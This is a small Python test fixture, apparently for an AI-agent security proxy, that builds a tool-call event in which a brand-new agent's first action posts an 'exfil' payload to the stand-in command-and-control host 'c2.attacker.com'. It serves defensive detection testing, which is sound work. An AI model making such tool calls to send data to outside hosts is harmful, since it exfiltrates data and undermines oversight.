from cerberus.proxy.models import ToolCallEvent


def get_cold_start_event(session_id="attack-cold-01", agent_id="new-agent-01") -> ToolCallEvent:
    # First ever call from a fresh agent is directly hostile
    return ToolCallEvent(
        session_id=session_id,
        agent_id=agent_id,
        tool_name="http_post",
        tool_server="webhook-server",
        parameters={"payload": "cold_start_exfil"},
        destination_domain="c2.attacker.com",
        sequence_position=0,
    )
